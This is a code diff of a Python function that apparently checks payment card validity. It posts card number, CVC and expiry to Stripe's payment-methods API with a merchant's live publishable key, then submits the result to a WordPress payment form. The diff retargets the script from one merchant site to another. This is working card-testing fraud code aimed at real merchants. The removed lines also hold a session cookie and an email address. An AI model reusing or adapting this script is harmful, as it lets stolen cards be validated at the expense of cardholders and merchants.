@@ -26,34 +26,26 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fspreadjoy.cc&time_on_page=39117&client_attribution_metadata[client_session_id]=NA&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51GOSCsBBWTdpGUaJgKV4p0IeEgpanPus7BsoMKsQtxwlkXs96ZfDMnhDzUSPyY1kkGLPsREuwgld0nFwsDMPdaq600toBVavJx&_stripe_version=2024-06-20'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+card-element&referrer=https%3A%2F%2Floveaprisoner.com&time_on_page=95693&key=pk_live_51JIGi9Fh7Zzb7IxvKHDKPfhqQpsyEcGAN4xRSjSN1MLCdQy91izooxlLjxQQJphHmhCMI3lFLY0Lvig6JCDSJ5G000ytPlehTg'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c',
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F',
-	    'sbjs_first_add': 'fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F',
-	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-	    '__stripe_sid': '80e459a3-0f9a-4807-9669-8aa4e4df6cc3f184e9',
-	    'breeze_folder_name': '846d9e2eb7f3e5ad6a8e69a3f374e8bbdcdf7843',
-	    'wordpress_logged_in_ec2848058ab4b75ac3ed19717b05f12c': 'rodamuser08%40gmail.com%7C1738114781%7CjNUeEsEfQy2h0THBjVMHIdSHrpUlqEmYPqPmcw1dvGC%7C8038ed9babd681adb0e8381bc84fefdaa285254d0151122525fdaeb26fbb0d8e',
-	    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F',
+	    'pvc_visits[0]': '1738064634b14305',
+	    '__stripe_mid': '4f189af3-5911-4c31-8679-d1d72134acf9954893',
+	    '__stripe_sid': '47903b1a-2428-49ee-bf8a-493393439f05704684',
 	}
 	
 	headers = {
-	    'authority': 'spreadjoy.cc',
+	    'authority': 'loveaprisoner.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=80e459a3-0f9a-4807-9669-8aa4e4df6cc3f184e9; breeze_folder_name=846d9e2eb7f3e5ad6a8e69a3f374e8bbdcdf7843; wordpress_logged_in_ec2848058ab4b75ac3ed19717b05f12c=rodamuser08%40gmail.com%7C1738114781%7CjNUeEsEfQy2h0THBjVMHIdSHrpUlqEmYPqPmcw1dvGC%7C8038ed9babd681adb0e8381bc84fefdaa285254d0151122525fdaeb26fbb0d8e; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F',
-	    'origin': 'https://spreadjoy.cc',
-	    'referer': 'https://spreadjoy.cc/my-account/add-payment-method/',
+	    # 'cookie': 'pvc_visits[0]=1738064634b14305; __stripe_mid=4f189af3-5911-4c31-8679-d1d72134acf9954893; __stripe_sid=47903b1a-2428-49ee-bf8a-493393439f05704684',
+	    'origin': 'https://loveaprisoner.com',
+	    'referer': 'https://loveaprisoner.com/payment/',
 	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -65,16 +57,21 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+	    't': '1737978329018',
 	}
 	
 	data = {
-	    'action': 'create_and_confirm_setup_intent',
-	    'wc-stripe-payment-method': pm,
-	    'wc-stripe-payment-type': 'card',
-	    '_ajax_nonce': 'd601eefbdd',
+	    'data': '__fluent_form_embded_post_id=14305&_fluentform_13_fluentformnonce=aa320f71ef&_wp_http_referer=%2Fpayment%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_text=1&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'action': 'fluentform_submit',
+	    'form_id': '13',
 	}
 	
-	r2 = requests.post('https://spreadjoy.cc/', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post(
+	    'https://loveaprisoner.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return (r2.json())
